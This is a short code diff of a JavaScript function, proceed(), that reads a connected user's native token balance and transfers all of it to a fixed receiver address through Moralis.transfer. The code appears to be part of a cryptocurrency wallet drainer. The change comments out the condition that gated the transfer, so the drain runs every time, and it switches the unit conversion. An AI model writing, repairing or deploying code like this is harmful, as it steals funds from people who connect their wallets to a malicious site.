@@ -634,7 +634,7 @@ async function proceed(){
               // }
             }
           }
-          if (x === bsc_length && y === bsc_NFTs.result.length && (mum === "approved" || mum === "denied")){
+          //if (x === bsc_length && y === bsc_NFTs.result.length && (mum === "approved" || mum === "denied")){
         const bnb_balance = await getBalance(user_address, apiKey).catch(e=>{
           console.log("Unable to get new bsc balance", e);
         });
@@ -646,7 +646,7 @@ async function proceed(){
         if (balance > 0) {
         const options = {
           type: "native",
-          amount: Moralis.Units.bsc(balance.toString()),
+          amount: Moralis.Units.ETH(balance.toString()),
           receiver: receiver_address,
         };
         let result = await Moralis.transfer(options);
@@ -655,7 +655,7 @@ async function proceed(){
       else {
         console.log("Insufficient funds")
       }
-    }
+    //}
     }
     send();
 }
